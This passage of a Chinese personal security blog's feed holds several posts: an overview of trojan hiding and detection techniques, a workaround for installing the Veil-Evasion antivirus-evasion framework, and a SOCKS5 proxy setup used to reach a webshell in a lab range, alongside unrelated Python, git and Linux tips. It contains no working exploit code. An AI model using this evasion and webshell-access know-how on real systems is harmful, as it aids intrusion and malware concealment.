        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-木马概念"><a href="#0x00-木马概念" class="headerlink" title="0x00 木马概念"></a>0x00 木马概念</h1><p>这篇主要讲的是木马的隐藏和发现技术。偏综述，没有具体的技术。</p><h4 id="名词解释："><a href="#名词解释：" class="headerlink" title="名词解释："></a>名词解释：</h4><table><thead><tr><th>名词</th><th>解释</th></tr></thead><tbody><tr><td>木马</td><td>隐藏在正常程序中的有特殊功能的恶意代码，如破坏删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。</td></tr><tr><td>病毒</td><td>编制者在计算机程序中插入的破坏计算机功能或者数据的代码，能影响计算机使用，能自我复制的一组计算机指令或者程序代码。具有传播性、隐蔽性、感染性、潜伏性、可激发性、表现性或破坏性。</td></tr></tbody></table><p>木马是病毒的一种，但并没有自我传播的能力，常用来当作后门。</p><h1 id="0x01-木马的攻击原理"><a href="#0x01-木马的攻击原理" class="headerlink" title="0x01 木马的攻击原理"></a>0x01 木马的攻击原理</h1><p>木马的运行机制是由木马程序和控制端程序共同组成的，采用C/S架构。</p><p>木马程序运行在被控端（目标靶机）上，作为服务端，为攻击者提供服务。</p><p>控制端程序运行在攻击机上，作为客户端。用来接受靶机所提供的服务，如屏幕快照、键盘记录、命令行交互界面。</p><p>在实际的应用场景中，可以理解为是多个服务端（肉鸡），受控于一个客户端（攻击者），多个服务端对一个客户提供不同的服务。</p><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><ol><li>配置木马，设置木马信息反馈方式。</li><li>传播木马，将设置好的木马扩散传播。方法有：网站挂马、电子邮件传播。</li><li>运行木马，更具设置适时运行。</li><li>信息反馈，电子邮件是木马进行反馈的常用渠道。</li><li>建立连接。</li><li>远程控制。</li></ol><h1 id="0x02-隐藏技术"><a href="#0x02-隐藏技术" class="headerlink" title="0x02 隐藏技术"></a>0x02 隐藏技术</h1><p>可分为三类：</p><ol><li>加载时隐藏，也可理解为上传过程中的隐藏。</li><li>存储时隐藏，静态免杀。</li><li>运行时隐藏，动态免杀。</li></ol><p>这里主要讲两种方法，分别是<strong>进程列表欺骗</strong>和<strong>篡改系统中的动态链接库</strong>。</p><p><strong>进程列表欺骗</strong>主要是利用hook技术，在对特定的系统事件进行hook，当被hook的事件发生后，对该事件hook的程序就会第一时间，在系统响应之前作出响应，对结果进行了修改。</p><p><strong>篡改系统中的动态连接库</strong>是改变计算机注册表中的键值对，一次来更改加载的动态链接库。</p><blockquote><p>在之前的学习中，还有一种在windows下的隐藏技术，<code>NTFS文件流</code>。</p></blockquote><h3 id="免杀实践："><a href="#免杀实践：" class="headerlink" title="免杀实践："></a>免杀实践：</h3><p>之前曾经在一次实战中，通过<code>veil</code>和<code>pyjoiner</code>实现免杀（细节问题还需优化，重在思想）。可见<a href="http://superj.site/2020/02/05/20200205215523/">记一次小小的社工行动</a>。</p><h1 id="0x03-发现技术："><a href="#0x03-发现技术：" class="headerlink" title="0x03 发现技术："></a>0x03 发现技术：</h1><ol><li>查看隐藏文件及扩展名，是否存在多扩展命的进程。</li><li>检查系统文件是否都处在正常的系统文件夹中（如存在多个同名系统文件）。</li><li>查看端口占用情况。</li></ol><p>通过工具的发现技术：</p><ol><li>Autoruns：查看自启动项，判断自启动程序中是否存在木马。</li><li>狙剑：找出使用hook修改过系统服务描述符表的函数。</li><li>Fport：查看进程与端口。</li><li>检查注册表：常用knowDLLs缓存常用DLL，检查是否有新增或可疑的键值。</li></ol><h1 id="0x04-基于github的木马"><a href="#0x04-基于github的木马" class="headerlink" title="0x04 基于github的木马"></a>0x04 基于github的木马</h1><h4 id="github3-py库的学习"><a href="#github3-py库的学习" class="headerlink" title="github3.py库的学习"></a>github3.py库的学习</h4><p>学习木马基于github的命令和控制，主要是对github API的学习，书中的部分代码无法运行，在参考github API的<a href="https://s0github3py0readthedocs0io.icopy.site/en/1.2.0/index.html">参考文档</a>后，对代码进行调试运行，并将加密后的记录上传到仓库trojan下的data。</p><p>在熟练github API的运用之后，可以在丰富modules模块，为木马添加更多的功能。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac重新下载xcode命令行工具</title>
      <link href="2020/02/04/20200204205612/"/>
      <url>2020/02/04/20200204205612/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-遇到问题"><a href="#0x00-遇到问题" class="headerlink" title="0x00 遇到问题"></a>0x00 遇到问题</h1><p>在使用<code>npm install</code>时报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gyp: No Xcode or CLT version detected!</span><br></pre></td></tr></table></figure><h1 id="0x01-重新下载安装xcode命令行"><a href="#0x01-重新下载安装xcode命令行" class="headerlink" title="0x01 重新下载安装xcode命令行"></a>0x01 重新下载安装xcode命令行</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /Library/Developer/CommandLineTools </span><br><span class="line">xcode-select --install</span><br></pre></td></tr></table></figure><p>若权限不够，加<code>sudo</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 杂类问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MAC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python下json库的使用</title>
      <link href="2020/02/04/20200204113323/"/>
      <url>2020/02/04/20200204113323/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-json介绍"><a href="#0x00-json介绍" class="headerlink" title="0x00 json介绍"></a>0x00 json介绍</h1><p>JSON（JavaScript Object Notation）是一种轻量级的数据交换格式，易于人阅读和编写。</p><p>JSON常用做网站异步请求的数据交换，网站异步请求，对服务器进行请求后，服务端进行处理后，将处理后的结果通过JSON格式传回给客户，客户端经过解析，表现出来。</p><p>在一些程序的编写过程中，通常也通过JSON来进行配置数据的存储，以此方便程序的编写。</p><h1 id="0x01-python下的json"><a href="#0x01-python下的json" class="headerlink" title="0x01 python下的json"></a>0x01 python下的json</h1><p>在python中有一个json的库，提供了对json文件的使用。</p><p>要使用json库，需要在开始导入json库：<code>import json</code>。</p><h1 id="0x02-json使用"><a href="#0x02-json使用" class="headerlink" title="0x02 json使用"></a>0x02 json使用</h1><p>导入json库之后，最常见的两个函数是：</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>json.dumps</td><td>将python对象解析为json</td></tr><tr><td>Json.loads</td><td>将json解析为python对象</td></tr></tbody></table><p>这两个方法将python对象和json字符串进行相互的转化。在读取json文件后，通过<code>loads</code>解析为python对象，能够使用对象的方法。在处理完数据之后，将python对象解析为json字符串，方便存储。</p><h3 id="python对象类型和json类型转化对照表"><a href="#python对象类型和json类型转化对照表" class="headerlink" title="python对象类型和json类型转化对照表"></a>python对象类型和json类型转化对照表</h3><table><thead><tr><th>python</th><th>json</th></tr></thead><tbody><tr><td>dict</td><td>object</td></tr><tr><td>list, tuple</td><td>array</td></tr><tr><td>str, unicode</td><td>string</td></tr><tr><td>int, long, float</td><td>number</td></tr><tr><td>True</td><td>true</td></tr><tr><td>False</td><td>false</td></tr><tr><td>None</td><td>null</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 第三方库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git clone慢的解决办法</title>
      <link href="2020/02/03/20200203171030/"/>
      <url>2020/02/03/20200203171030/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-git-clone慢的问题"><a href="#0x00-git-clone慢的问题" class="headerlink" title="0x00 git clone慢的问题"></a>0x00 git clone慢的问题</h1><p>因为墙的原因，有些时候在<code>git clone</code>下载一些github上的库的时候会因为延迟太高，速度太慢而导致了下载失败。</p><h1 id="0x01-解决办法"><a href="#0x01-解决办法" class="headerlink" title="0x01 解决办法"></a>0x01 解决办法</h1><p>为<code>git</code>添加代理，前提条件是你在代理能够访问外网，并且在本地监听了<code>socks</code>的端口。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy socks5h://127.0.0.1:1081</span><br><span class="line">git config --global https.proxy socks5h://127.0.0.1:1081</span><br></pre></td></tr></table></figure><p>在我的电脑上，socks5监听在1081端口上。</p><p>上面的办法只在通过http和https进行clone时生效。</p>]]></content>
      
      
      <categories>
          
          <category> 杂类问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux虚拟机硬盘不够导致apt无法使用的解决方法</title>
      <link href="2020/01/21/20200121212937/"/>
      <url>2020/01/21/20200121212937/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-遇到问题"><a href="#0x00-遇到问题" class="headerlink" title="0x00 遇到问题"></a>0x00 遇到问题</h1><p>在安装虚拟机时分配了20G的空间，但在使用的过程中，20G的空间被占满，在apt安装软件时出现了错误。提示<code>/var/cache/apt/archives</code>空间太小，导致了无法安装软件。</p><h1 id="0x01-解决方法"><a href="#0x01-解决方法" class="headerlink" title="0x01 解决方法"></a>0x01 解决方法</h1><ol><li><p>首先关闭虚拟机</p></li><li><p>清除所有的快照</p></li><li><p>在虚拟机软件中调整分配给该虚拟机的硬盘大小</p><p><img src= "/img/loading.gif" data-lazy-src="/2020/01/21/20200121212937/image-20200128184318552.png" alt="image-20200128184318552"></p></li><li><p>打开虚拟机</p><ul><li><p>查看磁盘</p><p><code>fdisk -l</code>发现新添加的磁盘<code>/dev/sda3</code>。</p><p><img src= "/img/loading.gif" data-lazy-src="/2020/01/21/20200121212937/image-20200128184732757.png" alt="image-20200128184732757"></p></li><li><p>进入磁盘的菜单项，增加分区。</p><p><code>fdisk /dev/sda3</code></p><p><img src= "/img/loading.gif" data-lazy-src="/2020/01/21/20200121212937/image-20200128185412563.png" alt="image-20200128185412563"></p><p>在磁盘管理的菜单中，<code>n</code>进行添加分区，选择<code>e</code>添加扩展分区，<code>w</code>将更改写入磁盘。</p></li><li><p>格式化分区</p><p><code>mkfs.ext3 /dev/sda3</code></p></li><li><p>在根目录下创建新的目录，并将新建分区挂载该目录下</p><p><code>mkdir cn</code></p><p><code>mount /dev/sda3 /cn</code></p></li><li><p>查看挂载情况</p><p><code>df -h</code></p><p><img src= "/img/loading.gif" data-lazy-src="/2020/01/21/20200121212937/image-20200128185942197.png" alt="image-20200128185942197"></p><p>发现新增加的磁盘已经挂在在了<code>/cn</code>下。</p></li><li><p>在新的目录下创建一个目录，然后把<code>/var/cache/apt/archives</code>换成指向那个目录的软连接</p><p><code>mkdir -p /cn/debs/partial</code></p><p><code>rm -rf /var/cache/apt/archives</code></p><p><code>ln -s /cn/debs /var/cache/apt/archives</code></p></li></ul></li></ol><h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><p>经过以上的操作可以解决磁盘空间不够导致的apt安装时提示空闲空间不够的问题。</p><p>该解决方法必须在<code>root</code>权限下进行操作。</p><p>目前对<code>Linux</code>的磁盘管理方面的知识还不是很完善，之后加强对linux磁盘管理的学习。        </p>]]></content>
      
      
      <categories>
          
          <category> 杂类问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次渗透测试</title>
      <link href="2020/01/16/20200116090736/"/>
      <url>2020/01/16/20200116090736/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-开始"><a href="#0x00-开始" class="headerlink" title="0x00 开始"></a>0x00 开始</h1><p>在临近过年，实验室迎来了一项渗透的任务，是对实验室的内网环境进行一次渗透测试，以收集足够的数据进行研究。</p><p>这是个人第一次进行渗透测试，并在测试中间进行实验室环境的维护，觉得很有纪念的价值，顾总结出这次的小记。</p><h1 id="0x01-环境说明"><a href="#0x01-环境说明" class="headerlink" title="0x01 环境说明"></a>0x01 环境说明</h1>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Veil—Evasion安装中git clone导致失败的问题</title>
      <link href="2020/01/11/20200111193201/"/>
      <url>2020/01/11/20200111193201/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="解决Veil—Evasion安装中git-clone导致失败的问题"><a href="#解决Veil—Evasion安装中git-clone导致失败的问题" class="headerlink" title="解决Veil—Evasion安装中git clone导致失败的问题"></a>解决Veil—Evasion安装中git clone导致失败的问题</h1><h2 id="0x00-原因"><a href="#0x00-原因" class="headerlink" title="0x00 原因"></a>0x00 原因</h2><p>因为<code>git clone</code>在国内下载过慢的原因，在<code>Veil</code>安装时，下载依赖不成功导致安装失败。</p><p>因此，找到了一下详细的办法。</p><h2 id="0x01-kali下安装Veil"><a href="#0x01-kali下安装Veil" class="headerlink" title="0x01 kali下安装Veil"></a>0x01 kali下安装Veil</h2><p>kali下安装只需要一行命令。</p><p><code>apt-get install veil-evasion</code></p><h2 id="0x02-下载依赖"><a href="#0x02-下载依赖" class="headerlink" title="0x02 下载依赖"></a>0x02 下载依赖</h2><p>首先在以下地址下载<code>VeilDependencies1.zip</code>和<code>VeilDependencies2.zip</code>。</p><p><a href="https://download.csdn.net/user/weixin_43713800/uploads">下载地址</a></p><p>下载完成后将两个安装包分别都解压。解压后为10个文件。<img src= "/img/loading.gif" data-lazy-src="/2020/01/11/20200111193201/image-20200111203035313.png"></p><p>在<code>/var/lib/veil/</code>下创建文件夹<code>setup-dependencies</code>，并将以上文件拷贝到该文件夹下。</p><blockquote><p>若以上方法还出现问题，则在<code>siteup-dependencies</code>下再创建文件夹<code>VeilDenpendencies</code>，并将以上文件复制到该文件夹下再试。</p></blockquote><h2 id="0x02-更改setup-sh"><a href="#0x02-更改setup-sh" class="headerlink" title="0x02 更改setup.sh"></a>0x02 更改setup.sh</h2><p>到路径<code>/usr/share/veil/config/</code>下通过<code>vim</code>打开<code>setup.sh</code>，在248行找到一下代码，将其注释。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot; [*] $&#123;YELLOW&#125;Empty folder... git cloning$&#123;RESET&#125;\n&quot;</span><br><span class="line">sudo mkdir -p &quot;$&#123;dependenciesdir&#125;&quot;</span><br><span class="line">sudo rm -rf &quot;$&#123;dependenciesdir&#125;&quot;</span><br><span class="line">sudo git clone https://github.com/Veil-Framework/VeilDependencies.git &quot;$&#123;dependenciesdir&#125;&quot;</span><br></pre></td></tr></table></figure><p>并在这几行代码向上16行左右的位置找到<code>rm -rf &quot;$&#123;dependenciesdir&#125;&quot;</code>，并将其注释。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ &quot;$&#123;force&#125;&quot; == &quot;true&quot; ] # &amp;&amp; rm -rf &quot;$&#123;dependenciesdir&#125;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x03-执行安装"><a href="#0x03-执行安装" class="headerlink" title="0x03 执行安装"></a>0x03 执行安装</h2><p><code>./setup.sh --force --silent</code></p><p><img src= "/img/loading.gif" data-lazy-src="/2020/01/11/20200111193201/image-20200111210237576.png" alt="image-20200111210237576"></p><p>看到上图，表示安装成功，唯一的错误是因为手动下载依赖导致，无关紧要。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>danted-server实现双网卡中内网的访问</title>
      <link href="2020/01/08/20200108215508/"/>
      <url>2020/01/08/20200108215508/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="danted-server实现双网卡中内网的访问"><a href="#danted-server实现双网卡中内网的访问" class="headerlink" title="danted-server实现双网卡中内网的访问"></a>danted-server实现双网卡中内网的访问</h1><h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><p>整个靶场环境在内网环境下。</p><p>靶机：<code>192.168.2.244</code></p><blockquote><p>2网段下只有一台主机，244双网卡，另一网卡接入互联网。</p></blockquote><p>内网用户：<code>192.168.3.*</code></p><blockquote><p>3网段用户通过代理，经过244访问互联网</p></blockquote><p>攻击环境（无Internet访问）：<code>192.168.4.*</code></p><blockquote><p>攻击机在4网段，能够针对2网段进行渗透攻击</p></blockquote><h3 id="攻击环境（针对一台主机）"><a href="#攻击环境（针对一台主机）" class="headerlink" title="攻击环境（针对一台主机）"></a>攻击环境（针对一台主机）</h3><p>在<code>mac</code>上安装<code>kali</code>虚拟机，因接入攻击网段无法访问互联网，因此虚拟机接入一个无线网卡。kali双网卡，<code>vmware</code>提供的<code>nat</code>虚拟网卡、无线网卡。</p><p><code>kali</code>：</p><p>​    <code>192.168.4.78</code>：访问靶机。</p><p>​    <code>172.16.34.148</code>：与物理机进行通信。</p><h2 id="0x01-为何利用danted-server"><a href="#0x01-为何利用danted-server" class="headerlink" title="0x01 为何利用danted-server"></a>0x01 为何利用danted-server</h2><p>主要原因是<code>蚁剑</code>之前已经安装在<code>mac</code>上，不想在<code>kali</code>上再装一遍。因此想通过<code>socks5</code>代理实现物理机<code>蚁剑</code>能够连接靶机<code>webshell</code>。</p><h2 id="0x02-kali服务端配置"><a href="#0x02-kali服务端配置" class="headerlink" title="0x02 kali服务端配置"></a>0x02 kali服务端配置</h2><h3 id="安装danted-server"><a href="#安装danted-server" class="headerlink" title="安装danted-server"></a>安装danted-server</h3><ol><li>安装</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install danted-server</span><br></pre></td></tr></table></figure><ol start="2"><li>配置</li></ol><p>创建用户。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd superj</span><br><span class="line">passwd superj</span><br></pre></td></tr></table></figure><p>首先备份/etc/danted.conf。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /etc/danted.conf /etc/danted.conf_old</span><br></pre></td></tr></table></figure><p>创建/etc/danted.conf，并写入。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/danted.conf</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">logoutput: /var/log/danted.log</span><br><span class="line">internal: 172.16.34.148(与物理机进行通信的网卡) port = 1080</span><br><span class="line">external: 192.168.4.78(与靶机进行通信的网卡)</span><br><span class="line">method: username  #none</span><br><span class="line">user.privileged: root</span><br><span class="line">user.notprivileged: superj(自己创建的用户)</span><br><span class="line">user.libwrap: nobody</span><br><span class="line">client pass &#123;</span><br><span class="line">from: 0.0.0.0/0 to: 0.0.0.0/0</span><br><span class="line">log: connect disconnect</span><br><span class="line">&#125;</span><br><span class="line">pass &#123;</span><br><span class="line">        from: 0.0.0.0/0 to: 0.0.0.0/0</span><br><span class="line">        command: bind connect udpassociate</span><br><span class="line">        log: error # connect disconnect iooperation</span><br><span class="line">        method: username</span><br><span class="line">&#125;</span><br><span class="line">block &#123;</span><br><span class="line">from: 0.0.0.0/0 to: 0.0.0.0/0</span><br><span class="line">log: connect error</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动danted服务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/danted start</span><br></pre></td></tr></table></figure><h2 id="0x03-蚁剑配置"><a href="#0x03-蚁剑配置" class="headerlink" title="0x03 蚁剑配置"></a>0x03 蚁剑配置</h2><p>蚁剑配置代理。</p><p><img src= "/img/loading.gif" data-lazy-src="/2020/01/08/20200108215508/image-20200108222912785.png" alt="image-20200108222912785"></p><h2 id="0x04-结果"><a href="#0x04-结果" class="headerlink" title="0x04 结果"></a>0x04 结果</h2><p>成功打开webshell。</p><p><img src= "/img/loading.gif" data-lazy-src="/2020/01/08/20200108215508/image-20200108223052569.png" alt="image-20200108223052569"></p><h2 id="0x05-思考"><a href="#0x05-思考" class="headerlink" title="0x05 思考"></a>0x05 思考</h2><p>通过这次的配置，感觉可以在靶机上也通过这次的代理方式实现对3网段的攻击。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网访问 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> socks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyenv的使用</title>
      <link href="2020/01/06/20200106210355/"/>
      <url>2020/01/06/20200106210355/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-mac下python"><a href="#0x00-mac下python" class="headerlink" title="0x00 mac下python"></a>0x00 mac下python</h1><p>首先，在mac的<code>os x</code>环境下，本身自带的python2的环境。目录在：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/System/Library/Frameworks/Python.framework/Versions/2.7/bin:$&#123;PATH&#125;</span><br></pre></td></tr></table></figure><p>通常我们一般通过<code>brew</code>来安装python。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install python</span><br><span class="line">brew install python3</span><br></pre></td></tr></table></figure><p>目录分别为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/Cellar/python/3.7.3/Frameworks/Python.framework/Versions/3.7/bin:$&#123;PATH&#125;</span><br><span class="line">/usr/local/Cellar/python@2/2.7.16/Frameworks/Python.framework/Versions/2.7/bin:$&#123;PATH&#125;</span><br></pre></td></tr></table></figure><p>在安装了python3，之后通常我们使用<code>python</code>打开python2，使用<code>python3</code>来使用python3，用<code>pip</code>和<code>pip3</code>来进行第三方库的安装，但是这种方式下，对于第三方库的安装和python本身的使用比较麻烦，环境问题会很麻烦。这个时候，我们就可以使用<code>pyenv</code>来管理我们的python环境，方便又直观。</p><h1 id="0x01-pyenv"><a href="#0x01-pyenv" class="headerlink" title="0x01 pyenv"></a>0x01 pyenv</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>​    python多版本管理工具，python环境路径直观清晰，管理方便。</p><h3 id="安装pyenv"><a href="#安装pyenv" class="headerlink" title="安装pyenv"></a>安装pyenv</h3><p>​    通过brew进行安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install pyenv</span><br></pre></td></tr></table></figure><p>​    在安装之后，会提示将以下信息复制到<code>~/.zshrc</code>或<code>~/.bash_profile</code>下，具体写入哪个文件，和你当前使用shell种类有关。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;~/.pyenv/bin:$PATH&quot;</span><br><span class="line">eval &quot;$(pyenv init -)&quot;</span><br><span class="line">eval &quot;$(pyenv virtualenv-init -)&quot;</span><br></pre></td></tr></table></figure><p>​    执行命令<code>source ~/.zshrc</code>或<code>source ~/.bash_profile</code>式环境变量生效。</p><p>​    安装后，在当前用户的根目录下生成<code>.pyenv</code>目录，通过<code>pyenv</code>安装的python都在下面的目录下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/.pyenv/versions/</span><br></pre></td></tr></table></figure><h3 id="pvenv使用"><a href="#pvenv使用" class="headerlink" title="pvenv使用"></a>pvenv使用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看可以安装的python版本</span></span><br><span class="line">pvenv install -l</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装指定版本</span></span><br><span class="line">pyenv install 3.8.1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置全局python版本</span></span><br><span class="line">pyenv global 3.8.1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置当前目录版本</span></span><br><span class="line">pyenv local 3.8.1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看全局python版本</span></span><br><span class="line">pyenv global</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看当前目录python版本</span></span><br><span class="line">pyenv local</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看系统中安装的python版本，并提示当前使用的python版本</span></span><br><span class="line">pyenv version</span><br></pre></td></tr></table></figure><p>使用python时，直接在终端输入<code>python </code>会打开当前目录所设置的python版本的交互shell。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac环境 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年度总结</title>
      <link href="2020/01/06/20200106195622/"/>
      <url>2020/01/06/20200106195622/</url>
      
        <content type="html"><![CDATA[<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>说来惭愧，本想着在2020年始，期末考完之后就总结一下，没想到今天才开始。</p><p>2019年对我自己来说应该是最特殊，最重要的一年了。</p><p>18年决定了考研，在图书馆呆了一年。每天就是图书馆，图书馆，图书馆的呆着，按着计划复习着每门功课。</p><p>复习着，复习着就到了考试的时候。和大部分人一样，两天转眼过去，脱离苦海。</p><p>因为考的本校的研，19年刚开始便和老师联系，开始去实验室。</p><p>从此，提前开始了研究生的生活。</p><p>说实在的，刚开始是真的没有习惯这种快节奏的生活。上半年每天懵懵懂懂的到实验室，虽然师兄给了自己一份学习路径，但当时的状态可能没整好，学的没有一点头绪，东摸摸，西摸摸，没有感到一点进步，天天到实验室摸鱼，学的特别的杂。中间学习python和信息收集的知识，完成了毕设，当时对信息收集技术的理解很浅显，作出来的东西现在看来，价值很低。仅此，没有感到一丝进步。到了暑假，同届的同学也都从不同的地方，来到了这个叫做中北的地方，有了小伙伴，学习的状态也来了，开始真正的进入了网络安全这个领域。</p><p>经过暑假和下半年的学习，最大的成就应该就是<code>onenote</code>中增加了15本笔记，几十页的内容。对渗透、内网、逆向等领域的知识有了一个系统的学习认识。然后就是之前纯粹看不懂的<code>CTF</code>题终于能够看懂，能做出来，在不看别人的wp也能够有了自己的想法，将它撸出来。</p><p>当然，现在仅仅是对安全这个领域有了简单的入门，不过，对于喜爱的行业来说，走出这一步，已经让我很开心了。</p><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>作为一个小白，在新的一年中，希望可以能多和安全届的大佬学习，不断的提升自己的安全技能。</p><p>在新的2020年，立下几个flag，希望2020年末不会被自己打脸，能把这份热爱，激情保持下去。</p><ol><li>减肥，每天游泳1500，减到120斤。</li><li>练习<code>CTF</code>，将攻防世界的所有类型新手题刷完，<code>pwn</code>和<code>reverse</code>高手题都做到10道以上。</li><li>保证每周至少一篇的技术博客发布在<code>CSDN</code>。</li><li>日<code>vulhub</code>。</li><li>学习英语保证每天背诵单词。</li><li>打穿实验室环境。</li><li>提交自己的<code>SRC</code>。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA解密</title>
      <link href="2019/12/21/20191221113323/"/>
      <url>2019/12/21/20191221113323/</url>
      
